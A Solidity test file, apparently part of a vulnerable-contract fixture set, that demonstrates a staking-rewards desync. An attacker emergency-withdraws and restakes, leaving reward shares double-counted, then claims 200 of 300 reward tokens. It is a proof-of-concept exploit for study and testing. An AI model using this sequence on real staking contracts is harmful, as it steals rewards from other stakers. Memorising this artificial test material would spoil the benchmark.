// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {TestBase, TestToken} from "./TestBase.sol";
import {IERC20} from "fixtures/10-staking-rewards-desync/src/IERC20.sol";
import {StakingPool} from "fixtures/10-staking-rewards-desync/src/StakingPool.sol";
import {RewardDistributor} from "fixtures/10-staking-rewards-desync/src/RewardDistributor.sol";

contract RewardsDesyncTest is TestBase {
    address internal constant ALICE = address(0xA11CE);
    address internal constant ATTACKER = address(0xBAD);

    TestToken internal stakeToken;
    TestToken internal rewardToken;
    StakingPool internal pool;
    RewardDistributor internal distributor;

    function setUp() public {
        stakeToken = new TestToken();
        rewardToken = new TestToken();
        pool = new StakingPool(IERC20(address(stakeToken)));
        distributor = new RewardDistributor(address(pool), IERC20(address(rewardToken)));
        pool.setDistributor(distributor);
    }

    function _stake(address who, uint256 amount) internal {
        stakeToken.mint(who, amount);
        vm.startPrank(who);
        stakeToken.approve(address(pool), amount);
        pool.stake(amount);
        vm.stopPrank();
    }

    function test_emergencyWithdrawKeepsRewardShares() public {
        _stake(ALICE, 100e18);
        _stake(ATTACKER, 100e18);
        vm.prank(ATTACKER);
        pool.emergencyWithdraw();
        vm.startPrank(ATTACKER);
        stakeToken.approve(address(pool), 100e18);
        pool.stake(100e18);
        vm.stopPrank();

        assertEq(pool.totalStaked(), 200e18, "pool holds 200");
        assertEq(distributor.totalShares(), 300e18, "distributor counts 300");

        rewardToken.mint(address(this), 300e18);
        rewardToken.approve(address(distributor), 300e18);
        distributor.notifyReward(300e18);

        vm.prank(ATTACKER);
        distributor.claim();
        // Equal stakes should split 300 evenly; the attacker takes 200.
        assertEq(rewardToken.balanceOf(ATTACKER), 200e18, "attacker paid on 200 shares");
        assertEq(distributor.pending(ALICE), 100e18, "alice paid on 100 shares");
    }
}
